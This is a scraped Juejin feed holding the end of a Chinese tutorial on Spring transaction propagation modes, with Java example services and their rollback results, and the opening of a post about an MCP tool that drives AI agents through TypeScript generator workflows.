    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
<span class="hljs-comment">//    @Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();
        test2Service.<span class="hljs-title function_">update</span>();
    }
}

<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>,propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">MANDATORY</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-comment">/**
 *现象：运行代码报错：No existing transaction found for transaction marked with propagation 'mandatory'
 *结论:被调用方法使用MANDATORY传播行为时，调用方法必须开启事务，否则运行报错
 */</span>
</code></pre>
<h4 data-id="heading-15">被调用方法使用<code>REQUIRES_NEW</code>传播行为</h4>
<h5 data-id="heading-16">调用方法有事务</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("test1Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Service test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test1Mapper test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test1Mapper.updateId1ColTo2();<span class="hljs-comment">//✅更新被回滚</span>
        test2Service.update();
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-meta">@Service("test2Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Mapper test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class,propagation = Propagation.REQUIRES_NEW)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test2Mapper.updateId1ColTo2();<span class="hljs-comment">//❌更新未被回滚</span>
    }
}

<span class="hljs-comment">/**
 *现象：调用方法中抛出异常，被调用方法中的更新未被回滚。
 *结论:被调用方法开启了独立的事务，与调用方法事务隔离。
 */</span>
</code></pre>
<h5 data-id="heading-17">调用方法无事务</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
<span class="hljs-comment">//    @Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        test2Service.<span class="hljs-title function_">update</span>();
    }
}

<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>,propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRES_NEW</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//✅更新被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-comment">/**
 *现象：被调用方法的更新被回滚
 *结论:被调用方法使用REQUIRES_NEW传播行为时，当调用方法未开启事务时，被调用方法开启独立事务。此情景下与REQUIRED传播行为一致。
 */</span>
</code></pre>
<h4 data-id="heading-18">被调用方法使用<code>NOT_SUPPORTED</code>传播行为</h4>
<h5 data-id="heading-19">调用方法有事务</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("test1Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Service test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test1Mapper test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test1Mapper.updateId1ColTo2();<span class="hljs-comment">//✅更新被回滚</span>
        test2Service.update();
    }
}

<span class="hljs-meta">@Service("test2Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Mapper test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class,propagation = Propagation.NOT_SUPPORTED)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test2Mapper.updateId1ColTo2();<span class="hljs-comment">//❌更新未被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-comment">/**
 *现象：被调用方法中抛出异常，被调用方法中的更新未被回滚，但调用方法更新被回滚。
 *结论:被调用方法不受事务管控，不管是自己还是调用方法出现异常都不会回滚更新操作。
 */</span>
</code></pre>
<h5 data-id="heading-20">调用方法无事务</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
<span class="hljs-comment">//    @Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        test2Service.<span class="hljs-title function_">update</span>();
    }
}

<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>,propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">NOT_SUPPORTED</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-comment">/**
 *现象：调用方法与被调用方法的更新均被回滚
 *结论:被调用方法使用NOT_SUPPORTED传播行为时，当调用方法未开启事务时，被调用方法以非事务方式运行。此情景下与不使用声明式事务现象一致。
 */</span>
</code></pre>
<h4 data-id="heading-21">被调用方法使用<code>NEVER</code>传播行为</h4>
<h5 data-id="heading-22">调用方法有事务</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("test1Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Service test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test1Mapper test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test1Mapper.updateId1ColTo2();
        test2Service.update();
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-meta">@Service("test2Service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> Test2Mapper test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class,propagation = Propagation.NEVER)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> {
        test2Mapper.updateId1ColTo2();
    }
}

<span class="hljs-comment">/**
 *现象：代码出现异常：Existing transaction found for transaction marked with propagation 'never'
 *结论:被调用方法必须被未开启事务的方法调用，否则异常。
 */</span>
</code></pre>
<h5 data-id="heading-23">调用方法无事务</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
<span class="hljs-comment">//    @Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        test2Service.<span class="hljs-title function_">update</span>();
    }
}

<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>,propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">NEVER</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-comment">/**
 *现象：调用方法与被调用方法的更新均未被回滚
 *结论:被调用方法使用NEVER传播行为时，当调用方法未开启事务时，被调用方法以非事务方式运行。此情景下与不使用声明式事务现象一致。
 */</span>
</code></pre>
<h4 data-id="heading-24">被调用方法使用<code>NESTED</code>传播行为</h4>
<h5 data-id="heading-25">调用方法有事务</h5>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class BatchProcessService {
    
    <span class="hljs-keyword">@Transactional</span>(propagation = Propagation.REQUIRED)
    public void batchProcessOrders(List&lt;Order&gt; orders) {
        for (Order order : orders) {
            try {
                <span class="hljs-comment">// 嵌套事务处理每个订单</span>
                <span class="hljs-built_in">processOrderNested</span>(order);
            } catch (Exception e) {
                <span class="hljs-comment">// 单个订单失败不影响其他订单</span>
                log<span class="hljs-selector-class">.error</span>("订单处理失败: {}", order.getId(), e);
            }
        }
    }
    
    <span class="hljs-keyword">@Transactional</span>(propagation = Propagation.NESTED)
    public void processOrderNested(Order order) {
        <span class="hljs-comment">// 嵌套事务，可以独立回滚</span>
        <span class="hljs-built_in">validateOrder</span>(order);
        <span class="hljs-built_in">deductInventory</span>(order);
        <span class="hljs-built_in">createPayment</span>(order);
        
        if (hasError(order)) {
            throw new <span class="hljs-built_in">RuntimeException</span>("订单处理失败");
        }
    }
}

<span class="hljs-comment">/**
 *现象：单个循环内的订单出现异常，不影响其他订单的更新提交
 *结论:如果当前存在事务，则在嵌套事务内执行（保存点机制）；如果不存在，则创建新事务。
 */</span>
</code></pre>
<h5 data-id="heading-26">调用方法无事务</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>(<span class="hljs-string">"test1Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Service</span> test2Service;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test1Mapper</span> test1Mapper;

    <span class="hljs-comment">/**
     * 调用方法
     */</span>
<span class="hljs-comment">//    @Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test1Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//❌更新未被回滚</span>
        test2Service.<span class="hljs-title function_">update</span>();
    }
}

<span class="hljs-meta">@Service</span>(<span class="hljs-string">"test2Service"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test2Service</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Test2Mapper</span> test2Mapper;

    <span class="hljs-comment">/**
     * 被调用方法
     */</span>
    <span class="hljs-meta">@Transactional</span>(rollbackFor = <span class="hljs-title class_">Exception</span>.<span class="hljs-property">class</span>,propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">NESTED</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
        test2Mapper.<span class="hljs-title function_">updateId1ColTo2</span>();<span class="hljs-comment">//✅更新被回滚</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"模拟异常"</span>);
    }
}

<span class="hljs-comment">/**
 *现象：被调用方法的更新被回滚
 *结论:被调用方法使用NESTED传播行为时，当调用方法未开启事务时，被调用方法开启独立事务。此情景下与REQUIRED传播行为一致。
 */</span>
</code></pre>
<blockquote>
<p>关注我！！！下篇文章为大家详细解释声明式事务各种失效场景</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何用一个 mcp 来教笨蛋 AI 好好干活]]></title>    <link>https://juejin.cn/post/7595771085394083891</link>    <guid>https://juejin.cn/post/7595771085394083891</guid>    <pubDate>2026-01-16T09:47:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595771085394083891" data-draft-id="7595610998033580059" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何用一个 mcp 来教笨蛋 AI 好好干活"/> <meta itemprop="keywords" content="前端,MCP"/> <meta itemprop="datePublished" content="2026-01-16T09:47:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="voderl"/> <meta itemprop="url" content="https://juejin.cn/user/2911162522930877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何用一个 mcp 来教笨蛋 AI 好好干活
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2911162522930877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    voderl
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:47:24.000Z" title="Fri Jan 16 2026 09:47:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">我们在写伪代码吗？</h2>
<p>相信很多人都有这种感觉：写 Prompt 越来越像在写伪代码</p>
<ul>
<li>“先 xxx，再 xxx” → 对应代码的执行顺序</li>
<li>“如果 xxx，就 xxx” → <code>if</code> 逻辑</li>
<li>“一直执行直到 xxx” → <code>while</code> 循环</li>
</ul>
<p>既然如此，我们能不能直接把一段“伪代码”丢给 AI？</p>
<p>kimi-k2 执行效果：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a8b7c79b8b74e4da090ce165a6d907e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdm9kZXJs:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769161662&amp;x-signature=CLcZ%2FXc27%2FSluD6oRMLiVlOnXMw%3D" alt="image.png" loading="lazy"/></p>
<p>看起来还可以！</p>
<p>给它加一点限制，让它从 1+...+ 到 n，同时排除所有位数之和加起来为 5 的倍数的数字，不能调用脚本：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> count = <span class="hljs-title class_">Tool</span>.<span class="hljs-title class_">AskUserQuestion</span>(<span class="hljs-string">`please input a number`</span>);
<span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= count; i++) {
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Prompt</span>(<span class="hljs-string">`<span class="hljs-subst">${i}</span> 的每个位数加起来之和为 5 的倍数`</span>)) {

  } <span class="hljs-keyword">else</span> {
    sum += i;
  }
}
<span class="hljs-title class_">Prompt</span>(<span class="hljs-string">`最终计算结果为 <span class="hljs-subst">${sum}</span>`</span>)
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55bdc0ea16a24e36be4a9365b7ddc997~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdm9kZXJs:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769161662&amp;x-signature=njlbHlCpHEC5vQnIv0MTQ69DK0I%3D" alt="image.png" loading="lazy"/></p>
<p>好吧，这下原型毕露了，比如 86 这个完全不应该排除的数字，被它直接排除掉了。</p>
<p>而且它是先计算的所有值的和，再减去需要排除的值，其实没有严格按照我们的逻辑来执行。</p>
<p>其实好好想一想上面的过程，我们把一个伪代码丢给大模型来执行，期望于就像把代码丢给编译器来执行一样，但是 AI 有着很多的幻觉，这个“编译器”很不稳定。</p>
<p>在一些复杂任务的实测里，它会跳过逻辑胡乱执行，比如没按照预期调用 tool，或者直接在半路上认为自己已经成功了，特别是一些笨蛋 AI，每次执行过程和结果可能都不一样。</p>
<h2 data-id="heading-1">可以用代码驱动 AI 吗？</h2>
<p>为了解决这种不稳定性，我们需要一种能强约束执行流程的工具。</p>
<p>在 Claude Code 或类似的 Agent 框架中，AI 可以根据 Tool 的返回决定下一步。那么，我们能不能反过来？由一段真实的代码来驱动 AI，AI 只负责完成其中的“自然语言函数”部分？</p>
<p>这正是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvoderl%2Fagent-workflow-mcp-tool" target="_blank" title="https://github.com/voderl/agent-workflow-mcp-tool" ref="nofollow noopener noreferrer">agent-workflow-mcp-tool</a> 的核心思路：利用 MCP (Model Context Protocol) 协议，通过 TypeScript 的 Generator 函数，将 AI 变成流程中的一个执行单元。</p>
<p>下面的代码是可以真实执行的代码而非伪代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>* <span class="hljs-title class_">Workflow</span>() {
  <span class="hljs-keyword">const</span> count = <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">ClaudeCodeTools</span>.<span class="hljs-title class_">AskUserQuestion</span>(
    <span class="hljs-string">`please input a number`</span>,
    z.<span class="hljs-title function_">number</span>()
  );

  <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= count; i++) {
    sum = <span class="hljs-keyword">yield</span>* <span class="hljs-title class_">Prompt</span>(<span class="hljs-string">`calculate <span class="hljs-subst">${sum}</span> + <span class="hljs-subst">${i}</span>`</span>, z.<span class="hljs-title function_">number</span>());
  }
  <span class="hljs-keyword">return</span> sum;
}
</code></pre>
<p>github 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvoderl%2Fagent-workflow-mcp-tool" target="_blank" title="https://github.com/voderl/agent-workflow-mcp-tool" ref="nofollow noopener noreferrer">github.com/voderl/agen…</a></p>
<p>它有哪些优势呢：</p>
<ul>
<li>用代码控制流程。 Agent lies, code not</li>
<li>使用 zod 强校验，避免模型幻觉</li>
